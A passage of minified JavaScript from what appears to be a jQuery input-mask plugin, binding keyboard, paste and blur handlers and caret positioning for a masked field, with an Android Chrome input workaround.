                            input.get(0) === document.activeElement && (writeBuffer(), pos == maskcc.replace("?", "").length ? input.caret(0, pos) : input.caret(pos));
                        }, 10);
                    }
                }).on("blur.maskcc", blurEvent).on("keydown.maskcc", keydownEvent).on("keypress.maskcc", keypressEvent).on("input.maskcc paste.maskcc", function() {
                    input.prop("readonly") || setTimeout(function() {
                        var pos = checkVal(!0);
                        input.caret(pos), tryFireCompleted();
                    }, 0);
                }), chrome && android && input.off("input.maskcc").on("input.maskcc", androidInputEvent), 
                checkVal();
            });
        }
    });
});